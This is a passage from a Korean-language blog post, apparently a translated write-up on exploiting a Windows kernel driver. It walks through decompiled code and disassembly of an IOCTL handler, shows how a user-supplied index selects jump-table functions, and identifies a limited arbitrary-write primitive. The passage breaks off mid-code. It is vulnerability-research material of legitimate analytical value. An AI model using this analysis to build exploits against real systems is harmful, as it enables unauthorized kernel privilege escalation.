alt="exploiting-driver-part2/Untitled%204.png"></p><p>&#xCC38;&#xACE0; : &#xC774;&#xB294; &#xC57D;&#xAC04;&#xC758; &#xD3EC;&#xC778;&#xD130; &#xC5F0;&#xC0B0;&#xC73C;&#xB85C; &#xC218;&#xD589;&#xB418;&#xC5B4; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; 25, 26, 27 &#xD589;&#xC744; &#xD574;&#xC11D;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><ul><li>25&#xD589; : <code>a2</code>&#xB97C; 64&#xBE44;&#xD2B8; &#xAC12; <code>(_QWORD *)</code>&#xC5D0; &#xB300;&#xD55C; &#xD3EC;&#xC778;&#xD130;&#xB85C; &#xCDE8;&#xAE09;&#xD558;&#xACE0; &#xD574;&#xB2F9; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xC5ED;&#xCC38;&#xC870;&#xD55C;&#xB2E4;.</li><li>26&#xD589; : &#xC704;&#xC640; &#xB3D9;&#xC77C;&#xD558;&#xC9C0;&#xB9CC; <code>a2</code>&#xB97C; 64&#xBE44;&#xD2B8; &#xAC12; &#xD3EC;&#xC778;&#xD130;&#xB85C; &#xCE90;&#xC2A4;&#xD305;&#xD55C; &#xD6C4; <code>+1</code>&#xC774; &#xCD94;&#xAC00;&#xB41C;&#xB2E4;. &#xC774;&#xB294; QWORD&#xC774;&#xBBC0;&#xB85C; &#xB2E4;&#xC74C; 8bytes &#xAC12;&#xC744; &#xC758;&#xBBF8;&#xD55C;&#xB2E4;.</li><li>27&#xD589; : &#xC704;&#xC758; &#xD589;&#xACFC; &#xB3D9;&#xC77C;&#xD558;&#xC9C0;&#xB9CC; <code>+2</code>&#xB85C; &#xC138; &#xBC88;&#xC9F8; QWORD&#xB85C; &#xAC74;&#xB108;&#xB6F0;&#xBBC0;&#xB85C; <code>a2</code> &#xB2E4;&#xC74C; 16bytes &#xAC12;&#xC744; &#xC758;&#xBBF8;&#xD55C;&#xB2E4;.</li></ul><p>&#xB2E4;&#xC74C; &#xCF54;&#xB4DC;&#xB294; <code>LABEL_6</code>&#xC73C;&#xB85C; &#xC2DC;&#xC791;&#xD55C;&#xB2E4;.</p><p><img src="/2021/04/28/l0ch/exploiting-driver-part2/Untitled%205.png" alt="exploiting-driver-part2/Untitled%205.png"></p><p><code>qword_38B28</code>&#xC740; &#xB7F0;&#xD0C0;&#xC784;&#xC5D0; 32&#xBE44;&#xD2B8; &#xAC12; <code>0x00000009</code>&#xC758; &#xC8FC;&#xC18C;&#xC774;&#xB2E4;. WinDbg&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC774; &#xD568;&#xC218;&#xC5D0; breakpoint&#xB97C; &#xC124;&#xC815;&#xD558;&#xACE0; &#xC774;&#xC804;&#xC5D0; &#xCC3E;&#xC740; IOCTL &#xCF54;&#xB4DC;&#xB85C; <code>DeviceIoControl</code> API&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xD655;&#xC778;&#xD588;&#xB2E4;. &#xC784;&#xC758;&#xC758; IOCTL &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0BC; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xC624;&#xD508;&#xC18C;&#xC2A4; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xC778; <a href="https://github.com/VoidSec/ioctlpus">IOCTLpus</a>&#xB97C; &#xD65C;&#xC6A9;&#xD588;&#xB2E4;. IOCTLpus&#xB294; Jackson Thuraisamy&#xC5D0;&#xC11C; &#xB9CC;&#xB4E4;&#xC5C8;&#xC9C0;&#xB9CC; &#xD604;&#xC7AC; VoidSec&#xC5D0;&#xC11C; &#xD3EC;&#xD06C; &#xC911; &#xD558;&#xB098;&#xB97C; &#xC801;&#xADF9;&#xC801;&#xC73C;&#xB85C; &#xAD00;&#xB9AC;&#xD558;&#xACE0; &#xC788;&#xB2E4;. &#xC784;&#xC758;&#xC758; &#xC785;&#xB825;&#xC73C;&#xB85C; <code>DeviceIoControl</code> &#xC694;&#xCCAD;&#xC744; &#xC218;&#xD589;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB294; &#xD234;&#xC774;&#xB2E4;.(Burp Repeater&#xC640; &#xC720;&#xC0AC;&#xD55C; &#xAE30;&#xB2A5;&#xC744; &#xD3EC;&#xD568;)</p><p><img src="/2021/04/28/l0ch/exploiting-driver-part2/Untitled%206.png" alt="exploiting-driver-part2/Untitled%206.png"></p><p>IOCTLpus&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC784;&#xC758;&#xC758; <code>DeviceIoControl</code> &#xC694;&#xCCAD;&#xC744; &#xC218;&#xD589;&#xD558;&#xACE0; <code>UserBuffer</code>&#xC758; &#xAC12;&#xC744; &#xBCC0;&#xACBD;&#xD558;&#xBA74;&#xC11C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xB110; &#xD3EC;&#xC778;&#xD130; &#xC5ED; &#xCC38;&#xC870;&#xAC00; &#xC544;&#xB2D8;&#xC744; &#xBC1C;&#xACAC;&#xD588;&#xB2E4;. ioctlbf &#xD37C;&#xC800;&#xAC00; &#xBAA8;&#xB4E0; &#xBC84;&#xD37C;&#xC758; &#xAC12;&#xC744; 0&#xC73C;&#xB85C; &#xC124;&#xC815;&#xD574;&#xBC84;&#xB824; &#xC784;&#xC758; &#xC4F0;&#xAE30;&#xAC00; &#xC544;&#xB2CC; &#xB110; &#xD3EC;&#xC778;&#xD130; &#xC5ED; &#xCC38;&#xC870;&#xCC98;&#xB7FC; &#xBCF4;&#xC778; &#xAC83;&#xC774;&#xB2E4;. </p><blockquote><p>Protip : WinDbg&#xB97C; &#xB514;&#xBC84;&#xAE30;&#xC5D0; &#xC5F0;&#xACB0; &#xD55C; &#xC9C1;&#xD6C4; <code>lm vm amp</code> &#xC73C;&#xB85C; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC758; base address&#xB97C; &#xAC00;&#xC838;&#xC628;&#xB2E4;. &#xADF8; &#xB4A4; IDA-&gt;Edit-&gt;Segments-&gt;Rebase &#xB85C; &#xD604;&#xC7AC; &#xD30C;&#xC77C;&#xC758; base address&#xB97C; &#xC124;&#xC815;&#xD558;&#xBA74; &#xB514;&#xCEF4;&#xD30C;&#xC77C;&#xB41C; &#xCF54;&#xB4DC;&#xC640; WinDbg&#xC5D0;&#xC11C; &#xC77C;&#xAD00;&#xC131;&#xC774; &#xC788;&#xB3C4;&#xB85D; &#xBD84;&#xC11D;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p></blockquote><p>34 &#xD589;&#xC5D0;&#xC11C; <code>qword_38B28</code>&#xC774; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; DWORD (32 &#xBE44;&#xD2B8; &#xAC12;)&#xB97C; <code>v4</code>&#xC640; &#xBE44;&#xAD50;&#xD558;&#xB294; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xB2E4;. &#xC774; &#xBCC0;&#xC218;&#xB294; <code>v8</code>&#xC5D0; &#xD3EC;&#xD568;&#xB41C; &#xAC12;&#xC73C;&#xB85C; &#xCD08;&#xAE30;&#xD654;&#xB418;&#xBA70;, &#xC774;&#xB294; &#xC785;&#xB825; &#xAD6C;&#xC870;&#xCCB4;&#xC758; &#xCCAB; &#xBC88;&#xC9F8; &#xD544;&#xB4DC; &#xAC12;&#xC774;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xC785;&#xB825; &#xBC84;&#xD37C;&#xC758; &#xCC98;&#xC74C; 4bytes&#xC5D0; <code>qword_38B28 (0x00000009)</code>&#xBCF4;&#xB2E4; &#xD06C;&#xAC70;&#xB098; &#xAC19;&#xC740; &#xAC12;&#xC774; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBA74; &#xAC80;&#xC0AC;&#xAC00; &#xC2E4;&#xD328;&#xD558;&#xACE0; <code>STATUS_INVALID_PARAMETER</code>&#xB97C; &#xBC18;&#xD658;&#xD55C;&#xB2E4;. &#xAC80;&#xC0AC;&#xAC00; &#xC131;&#xACF5;&#xD558;&#xBA74; &#xC785;&#xB825; &#xAD6C;&#xC870;&#xCCB4;&#xC758; &#xCCAB; &#xBC88;&#xC9F8; &#xD544;&#xB4DC; &#xAC12;&#xC774; switch case&#xC640; &#xAC19;&#xC740; &#xCF54;&#xB4DC;&#xC5D0; &#xB300;&#xD55C; &#xC778;&#xB371;&#xC2A4;&#xB85C; &#xC0AC;&#xC6A9;&#xB41C;&#xB2E4;.</p><pre><code class="hljs cpp">v8 = *(_QWORD *)(qword_38B28 + <span class="hljs-number">16</span>i64 * v4 + <span class="hljs-number">8</span>);-&gt; v8 = *(_QWORD *)(<span class="hljs-number">9</span> + <span class="hljs-number">16</span> * field1_user_buffer + <span class="hljs-number">8</span>);</code></pre><p>switch case &#xC778;&#xB371;&#xC2A4;&#xC778; &#xC774;&#xC720;&#xB294; &#xB2E4;&#xC74C; &#xC139;&#xC158;&#xC5D0;&#xC11C; v8&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xB9E4;&#xAC1C;&#xBCC0;&#xC218;&#xB85C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; <code>SUB_16C40</code> &#xD568;&#xC218;&#xB97C; &#xBD84;&#xC11D;&#xD558;&#xBA74;&#xC11C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><p><code>SUB_166D0</code> &#xC758; &#xC804;&#xCCB4; &#xCF54;&#xB4DC;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">DriverVulnerableFunction</span><span class="hljs-params">(<span class="hljs-keyword">bool</span> BoolIs32BitProcess, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *userBuffer, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> bufferSize)</span></span><span class="hljs-function"></span>{  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> field1_32; <span class="hljs-comment">// eax</span>  __int64 field2_32; <span class="hljs-comment">// r8</span>  __int64 field3_32_ptr; <span class="hljs-comment">// rbx</span>  __int64 field1_64; <span class="hljs-comment">// [rsp+20h] [rbp-28h] BYREF</span>  __int64 field2_64; <span class="hljs-comment">// [rsp+28h] [rbp-20h]</span>  __int64 field3_64_ptr; <span class="hljs-comment">// [rsp+30h] [rbp-18h]</span>  __int64 *v11; <span class="hljs-comment">// [rsp+38h] [rbp-10h]</span>  __int64 v12; <span class="hljs-comment">// [rsp+68h] [rbp+20h] BYREF</span>  <span class="hljs-keyword">if</span> ( BoolIs32BitProcess )  {                                             <span class="hljs-comment">// 32 bit Process</span>    <span class="hljs-keyword">if</span> ( bufferSize &gt;= <span class="hljs-number">12</span> )    {                                           <span class="hljs-comment">// Struct contaning 3 32-bits fields</span>      field1_32 = *userBuffer;                  <span class="hljs-comment">// (int)userBuffer[0];</span>      field2_32 = (<span class="hljs-keyword">int</span>)userBuffer[<span class="hljs-number">1</span>];      field3_32_ptr = (<span class="hljs-keyword">int</span>)userBuffer[<span class="hljs-number">2</span>];      <span class="hljs-keyword">goto</span> LABEL_6;    }    <span class="hljs-keyword">return</span> <span class="hljs-number">0xC0000023</span>i64;                       <span class="hljs-comment">// STATUS_BUFFER_TOO_SMALL</span>  }  <span class="hljs-keyword">if</span> ( bufferSize &lt; <span class="hljs-number">24</span> )                        <span class="hljs-comment">// 64 bit Process</span>    <span class="hljs-keyword">return</span> <span class="hljs-number">0xC0000023</span>i64;                       <span class="hljs-comment">// STATUS_BUFFER_TOO_SMALL</span>  field1_64 = *(_QWORD *)userBuffer;            <span class="hljs-comment">// Struct contaning 3 64-bits fields</span>  field2_64 = *((_QWORD *)userBuffer + <span class="hljs-number">1</span>);  field3_64_ptr = *((_QWORD *)userBuffer + <span class="hljs-number">2</span>);  field3_32_ptr = field3_64_ptr;  field2_32 = field2_64;  field1_32 = field1_64;LABEL_6:  <span class="hljs-keyword">if</span> ( !qword_FFFFF80068928B28 )    <span class="hljs-keyword">return</span> <span class="hljs-number">0xC0000001</span>i64;                       <span class="hljs-comment">// STATUS_UNSUCCESSFUL</span>  <span class="hljs-keyword">if</span> ( field1_32 &gt;= *(_DWORD *)qword_FFFFF80068928B28 )<span class="hljs-comment">// MUST BE &lt; 9</span>    <span class="hljs-keyword">return</span> <span class="hljs-number">0xC000000D</span>i64;                       <span class="hljs-comment">// STATUS_INVALID_PARAMETER</span>  field2_64 = field2_32;  field1_64 = *(_QWORD *)(qword_FFFFF80068928B28 + <span class="hljs-number">16</span>i64 * field1_32 + <span class="hljs-number">8</span>);<span class="hljs-comment">// jmp table (0-8)</span>  LODWORD(field3_64_ptr) = *(_DWORD *)(qword_FFFFF80068928B28 + <span class="hljs-number">16</span>i64 * field1_32 + <span class="hljs-number">16</span>);<span class="hljs-comment">// set lower 32 bits of fields3_64</span>  v11 = &amp;v12;  jmptable(&amp;field1_64);                         <span class="hljs-comment">// addr jmp table based</span>  <span class="hljs-keyword">if</span> ( BoolIs32BitProcess )    *(_DWORD *)field3_32_ptr = v12;  <span class="hljs-keyword">else</span>    *(_QWORD *)field3_32_ptr = v12;  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>i64;                                  <span class="hljs-comment">// SUCCESS</span>}</code></pre><h2 id="Analyzing-SUB-16C40"><a href="#Analyzing-SUB-16C40" class="headerlink" title="Analyzing SUB_16C40"></a>Analyzing SUB_16C40</h2><p>&#xC774; &#xD568;&#xC218;&#xB294; &#xB514;&#xCEF4;&#xD30C;&#xC77C; &#xCF54;&#xB4DC;&#xAC00; &#xADF8;&#xB2E4;&#xC9C0; &#xB3C4;&#xC6C0;&#xC774; &#xB418;&#xC9C0; &#xC54A;&#xC558;&#xACE0; &#xD574;&#xC11D;&#xC5D0; &#xC624;&#xD574;&#xC758; &#xC18C;&#xC9C0;&#xAC00; &#xC788;&#xC5B4; &#xACE8;&#xCE6B;&#xAC70;&#xB9AC;&#xC600;&#xB2E4;. </p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> __fastcall <span class="hljs-title">sub_16C40</span><span class="hljs-params">(__int64 a1)</span></span><span class="hljs-function"></span>{  <span class="hljs-keyword">unsigned</span> __int64 v2; <span class="hljs-comment">// rcx</span>  __int64 v3; <span class="hljs-comment">// rax</span>  <span class="hljs-keyword">void</span> *v4; <span class="hljs-comment">// rsp</span>  <span class="hljs-keyword">char</span> vars20; <span class="hljs-comment">// [rsp+20h] [rbp+20h] BYREF</span>  v2 = *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)(a1 + <span class="hljs-number">16</span>);  v3 = v2;  <span class="hljs-keyword">if</span> ( v2 &lt; <span class="hljs-number">0x20</span> )  {    v2 = <span class="hljs-number">40</span>i64;    v3 = <span class="hljs-number">32</span>i64;  }  v4 = alloca(v2);  <span class="hljs-keyword">if</span> ( v3 - <span class="hljs-number">32</span> &gt; <span class="hljs-number">0</span> )    qmemcpy(&amp;vars20, (<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *)(*(_QWORD *)(a1 + <span class="hljs-number">8</span>) + <span class="hljs-number">32</span>i64), v3 - <span class="hljs-number">32</span>);  **(_QWORD **)(a1 + <span class="hljs-number">24</span>) = (*(__int64 (__fastcall **)(_QWORD, _QWORD, _QWORD, _QWORD))a1)(                             **(_QWORD **)(a1 + <span class="hljs-number">8</span>),                             *(_QWORD *)(*(_QWORD *)(a1 + <span class="hljs-number">8</span>) + <span class="hljs-number">8</span>i64),                             *(_QWORD *)(*(_QWORD *)(a1 + <span class="hljs-number">8</span>) + <span class="hljs-number">16</span>i64),                             *(_QWORD *)(*(_QWORD *)(a1 + <span class="hljs-number">8</span>) + <span class="hljs-number">24</span>i64));}</code></pre><p>&#xC704;&#xC758; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C;&#xB294; &#xC720;&#xC800;&#xAC00; &#xC81C;&#xC5B4;&#xD560; &#xC218; &#xC788;&#xB294; &#xC704;&#xCE58;&#xC5D0; <code>userBuffer</code>&#xC758; &#xAC12;&#xC744; &#xBCF5;&#xC0AC;&#xD560; &#xB54C; &#xAC00;&#xB2A5;&#xD55C; &#xC784;&#xC758; &#xC4F0;&#xAE30; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xD2B8;&#xB9AC;&#xAC70; &#xB420; &#xC218; &#xC788;&#xC73C;&#xBBC0;&#xB85C; <code>qmemcpy</code>&#xAC00; &#xC801;&#xD569;&#xD55C; &#xD568;&#xC218;&#xB77C;&#xACE0; &#xC0DD;&#xAC01;&#xD588;&#xC73C;&#xBA70; <code>memcpy(* destination, * source, size_t);</code>&#xB97C; &#xC644;&#xC804;&#xD788; &#xC81C;&#xC5B4;&#xD560; &#xC218; &#xC788;&#xC744;  &#xAC83;&#xC73C;&#xB85C; &#xCD94;&#xCE21;&#xD588;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; &#xB54C;&#xB85C;&#xB294; &#xB098;&#xBB34;&#xC5D0; &#xC9D1;&#xC911;&#xD574; &#xC232;&#xC744; &#xBCF4;&#xC9C0; &#xBABB;&#xD558;&#xAC8C; &#xB41C;&#xB2E4;. &#xB9CE;&#xC740; &#xC2DC;&#xAC04;&#xC744; &#xBCF4;&#xB0B8; &#xD6C4; Access violation&#xC744; &#xC77C;&#xC73C;&#xD0A4;&#xB294; &#xBA85;&#xB839;&#xC774; memcpy &#xC790;&#xCCB4;&#xAC00; &#xC544;&#xB2CC; memcpy &#xC774;&#xD6C4;&#xC5D0; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xB2E4;&#xB978; &#xBA85;&#xB839;&#xACFC; &#xAD00;&#xB828;&#xC774; &#xC788;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xBC1C;&#xACAC;&#xD588;&#xB2E4;. &#xC774;&#xC804; &#xC139;&#xC158;&#xC5D0;&#xC11C; &#xC0DD;&#xAC01;&#xD574; &#xBCF4;&#xBA74; <code>amp+6c8d</code>&#xC5D0;&#xC11C; &#xC561;&#xC138;&#xC2A4; &#xC704;&#xBC18;&#xC774; &#xBC1C;&#xC0DD;&#xD588;&#xB2E4;. &#xB514;&#xCEF4;&#xD30C;&#xC77C; &#xB41C; &#xC758;&#xC0AC; &#xCF54;&#xB4DC;&#xAC00; &#xC544;&#xB2CC; &#xC6D0;&#xC2DC; &#xC5B4;&#xC148;&#xBE14;&#xB9AC;&#xB97C; &#xC0B4;&#xD3B4;&#xBCF4;&#xBA74; &#xB354; &#xC26C;&#xC6CC;&#xC9C4;&#xB2E4;.</p><pre><code class="hljs cpp">.text:<span class="hljs-number">0000000000016</span>C6A                 sub     rsp, rcx.text:<span class="hljs-number">0000000000016</span>C6D                 <span class="hljs-keyword">and</span>     rsp, <span class="hljs-number">0F</span>FFFFFFFFFFFFFF0h.text:<span class="hljs-number">0000000000016</span>C71                 lea     rcx, [rax<span class="hljs-number">-20</span>h].text:<span class="hljs-number">0000000000016</span>C75                 test    rcx, rcx.text:<span class="hljs-number">0000000000016</span>C78                 jle     <span class="hljs-keyword">short</span> loc_16C89.text:<span class="hljs-number">0000000000016</span>C7A                 mov     rsi, [rbx+<span class="hljs-number">8</span>].text:<span class="hljs-number">0000000000016</span>C7E                 lea     rsi, [rsi+<span class="hljs-number">20</span>h].text:<span class="hljs-number">0000000000016</span>C82                 lea     rdi, [rsp+var_s20].text:<span class="hljs-number">0000000000016</span>C87                 rep movsb.text:<span class="hljs-number">0000000000016</span>C89.text:<span class="hljs-number">0000000000016</span>C89 loc_16C89:                              ; CODE XREF: sub_16C40+<span class="hljs-number">38</span>&#x2191;j.text:<span class="hljs-number">0000000000016</span>C89                 mov     rsi, [rbx+<span class="hljs-number">8</span>].text:<span class="hljs-number">0000000000016</span>C8D                 mov     rcx, [rsi].text:<span class="hljs-number">0000000000016</span>C90                 mov     rdx, [rsi+<span class="hljs-number">8</span>].text:<span class="hljs-number">0000000000016</span>C94                 mov     r8, [rsi+<span class="hljs-number">10</span>h].text:<span class="hljs-number">0000000000016</span>C98                 mov     r9, [rsi+<span class="hljs-number">18</span>h].text:<span class="hljs-number">0000000000016</span>C9C                 call    qword ptr [rbx]</code></pre><p><code>16C8D</code>, <code>mov rcx, [rsi]</code>&#xC5D0;&#xC11C; &#xC561;&#xC138;&#xC2A4; &#xC704;&#xBC18;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xC9C0;&#xB9CC; &#xD574;&#xB2F9; &#xBA85;&#xB839; &#xBC14;&#xB85C; &#xC55E;&#xC744; &#xBCF4;&#xBA74; <code>memcpy</code>&#xC5D0; &#xB300;&#xD55C; &#xD638;&#xCD9C;&#xC740; &#xCC3E;&#xC744; &#xC218; &#xC5C6;&#xC5C8;&#xB2E4;. &#xC774;&#xB97C; &#xBC1D;&#xD788;&#xAE30; &#xC704;&#xD574; &#xC880; &#xB354; &#xD30C;&#xD5E4;&#xCCE4;&#xACE0; Reverse Engineering Discord Server&#xC758; &#xBA64;&#xBC84;&#xAC00; IDA&#xAC00; &#xB514;&#xCEF4;&#xD30C;&#xC77C;&#xC5D0;&#xC11C;  <code>qmempy</code>&#xB85C; &#xB098;&#xD0C0;&#xB0B4;&#xB294; &#xC774;&#xC720;&#xB294; <code>rsi</code>&#xC5D0;&#xC11C; <code>rdi</code>&#xB85C; <code>rcx</code> bytes &#xB9CC;&#xD07C; &#xBCF5;&#xC0AC;&#xD560; &#xB54C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; <code>rep movsb</code> &#xC758; <code>movsb</code>&#xB54C;&#xBB38;&#xC784;&#xC744; &#xC124;&#xBA85;&#xD588;&#xB2E4;. &#xC5B4;&#xCA0C;&#xB4E0; <code>mov rcx, [rsi]</code> &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC0B4;&#xD3B4;&#xBCF4;&#xACE0; <code>rsi</code> &#xD560;&#xB2F9;&#xACFC; &#xC0AC;&#xC6A9;&#xC744; &#xC5ED;&#xCD94;&#xC801;&#xD558;&#xBA74; &#xADF8; &#xAC12;&#xC774; <code>rcx</code>&#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC5D0;&#xC11C; &#xB098;&#xC628;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD588;&#xB2E4;.</p><pre><code class="hljs cpp">.text:<span class="hljs-number">0000000000016</span>C47                 mov     rbx, rcx....text:<span class="hljs-number">0000000000016</span>C89                 mov     rsi, [rbx+<span class="hljs-number">8</span>].text:<span class="hljs-number">0000000000016</span>C8D                 mov     rcx, [rsi]</code></pre><p>RCX &#xB808;&#xC9C0;&#xC2A4;&#xD130;(x86_64 fastcall convention)&#xB294; &#xD568;&#xC218; &#xC778;&#xC218;(<code>RCX</code>, <code>RDX</code>, <code>R8</code>, <code>R9</code>, &#xB098;&#xBA38;&#xC9C0; &#xC778;&#xC218;&#xB294; &#xC2A4;&#xD0DD;&#xC5D0; &#xC804;&#xB2EC;&#xB428;)&#xB97C; &#xC804;&#xB2EC;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB41C;&#xB2E4;. <code>SUB_16C40</code>&#xC740; <code>SUB_166D0</code>&#xC5D0;&#xC11C; &#xD558;&#xB098;&#xC758; &#xC778;&#xC218; <code>SUB_166D0&#xC758; v8</code> &#xB9CC; &#xBC1B;&#xC73C;&#xBBC0;&#xB85C; RCX&#xC5D0;&#xB294; <code>field1</code>&#xC5D0;&#xC11C; &#xAC00;&#xC838;&#xC628; &#xD574;&#xB2F9; &#xC778;&#xC218;&#xC758; &#xC8FC;&#xC18C;&#xAC00; &#xD3EC;&#xD568;&#xB41C;&#xB2E4;. &#xC774;&#xC81C; &#xC804;&#xCCB4; &#xC720;&#xC800; &#xBC84;&#xD37C;&#xB97C; ioctlbf &#xD37C;&#xC800;&#xAC00; 0&#xC73C;&#xB85C; &#xC124;&#xC815;&#xD574; &#xC561;&#xC138;&#xC2A4; &#xC704;&#xBC18;&#xC774; &#xBC1C;&#xC0DD;&#xD588;&#xC74C;&#xC744; &#xC54C; &#xC218; &#xC788;&#xB2E4;. &#xC774; &#xACBD;&#xC6B0; &#xCCAB; &#xBC88;&#xC9F8; &#xC720;&#xC800; &#xBC84;&#xD37C;&#xB294; <code>v8</code>&#xC758; &#xAC12; <code>v8 = *(_QWORD*)(9+16*field1_user_buffer + 8);</code>&#xC744; &#xACC4;&#xC0B0;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB418;&#xBA70; <code>mov rcx, [rsi]</code> &#xBA85;&#xB839;&#xC774; &#xC2E4;&#xD589;&#xB420; &#xB54C; <code>rsi</code>&#xB294; &#xC5ED;&#xCC38;&#xC870; &#xD560; &#xC720;&#xD6A8;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xBA54;&#xBAA8;&#xB9AC; &#xC704;&#xCE58;&#xC5D0; &#xB300;&#xD55C; &#xD3EC;&#xC778;&#xD130;&#xAC00; &#xB41C;&#xB2E4;. &#xC5B4;&#xC148;&#xBE14;&#xB9AC;&#xB97C; &#xB2E4;&#xC2DC; &#xC0B4;&#xD3B4;&#xBCF4;&#xBA74; <code>rcx</code>, <code>rdx</code>, <code>r8</code> &#xBC0F; <code>r9</code> &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB97C; &#xCC44;&#xC6B0;&#xB294; &#xB2E4;&#xB978; fastcall &#xD638;&#xCD9C;&#xC744; &#xD558;&#xB294; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xB2E4;.</p><pre><code class="hljs cpp">.text:<span class="hljs-number">0000000000016</span>C8D                 mov     rcx, [rsi].text:<span class="hljs-number">0000000000016</span>C90                 mov     rdx, [rsi+<span class="hljs-number">8</span>].text:<span class="hljs-number">0000000000016</span>C94                 mov     r8, [rsi+<span class="hljs-number">10</span>h].text:<span class="hljs-number">0000000000016</span>C98                 mov     r9, [rsi+<span class="hljs-number">18</span>h].text:<span class="hljs-number">0000000000016</span>C9C                 call    qword ptr [rbx]</code></pre><p>&#xC5EC;&#xAE30;&#xC11C; &#xD765;&#xBBF8;&#xB85C;&#xC6B4; &#xC810;&#xC774; &#xB098;&#xD0C0;&#xB098;&#xB294;&#xB370;, <code>16C47 mov rbx, rcx</code> &#xC774;&#xD6C4; <code>rbx</code>&#xAC00; &#xC720;&#xD6A8;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC;&#xBA74; call opcode&#xC5D0; &#xC758;&#xD574; &#xD638;&#xCD9C;&#xB418;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xC774;&#xB54C;  <code>RBX</code>&#xC758; &#xAC12;&#xC740; &#xB7F0;&#xD0C0;&#xC784;&#xC5D0;&#xC11C; &#xACC4;&#xC0B0;&#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; IDA&#xC758; &#xB514;&#xCEF4;&#xD30C;&#xC77C; &#xAE30;&#xB2A5;&#xC740; &#xC704; &#xBA85;&#xB839;&#xC5B4;&#xC758; &#xACB0;&#xACFC;&#xB97C; &#xB530;&#xB77C;&#xAC08; &#xC218; &#xC5C6;&#xB2E4;. <code>v8</code>&#xC740; <code>sub_166D0</code>&#xC5D0;&#xC11C; &#xBCFC; &#xC218; &#xC788;&#xB4EF;&#xC774; 0~8&#xAE4C;&#xC9C0;&#xC758; &#xAC12;&#xC744; &#xAC00;&#xC9C0;&#xBA70; &#xD638;&#xCD9C;&#xD560; &#xD568;&#xC218; index&#xB85C; &#xD65C;&#xC6A9;&#xB418;&#xBA70; <code>v8</code>&#xC758; &#xAC12;&#xC5D0; &#xB530;&#xB77C; &#xAC01;&#xAC01; &#xD638;&#xCD9C;&#xB418;&#xB294; &#xD568;&#xC218;&#xB4E4;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xB2E4;.</p><ol><li><code>sub_2CBA0</code></li><li><code>sub_2CB20</code></li><li><code>sub_2C960</code></li><li><code>sub_2C850</code></li><li><code>sub_2C7F0</code></li><li><code>sub_18D20</code></li><li><code>sub_2C510</code></li><li><code>sub_2C360</code></li><li><strong><code>sub_2C460</code> &lt;&lt;</strong></li></ol><h2 id="Analyzing-sub-2C460"><a href="#Analyzing-sub-2C460" class="headerlink" title="Analyzing sub_2C460"></a>Analyzing sub_2C460</h2><p>&#xC704; &#xD568;&#xC218;&#xB4E4; &#xC911; &#xC81C;&#xD55C;&#xB41C; arbitrary write&#xAC00; &#xAC00;&#xB2A5;&#xD558;&#xB2E4;&#xB294; &#xC810;&#xC5D0;&#xC11C; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC5D0; &#xC0AC;&#xC6A9;&#xD560; &#xD568;&#xC218;&#xB85C;&#xB294; <code>sub_2C460</code>&#xAC00; &#xAC00;&#xC7A5; &#xC720;&#xB825;&#xD588;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">jmp8</span><span class="hljs-params">(_DWORD *a1)</span></span><span class="hljs-function"></span>{  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v2; <span class="hljs-comment">// [rsp+20h] [rbp-38h]</span>  v2 = <span class="hljs-number">0</span>;  <span class="hljs-keyword">if</span> ( !a1 )  <span class="hljs-comment">// must be === 0</span>    <span class="hljs-keyword">return</span> <span class="hljs-number">0xFFFFFFFE</span>;  sub_FFFFF800689067D0((__int64)a1, <span 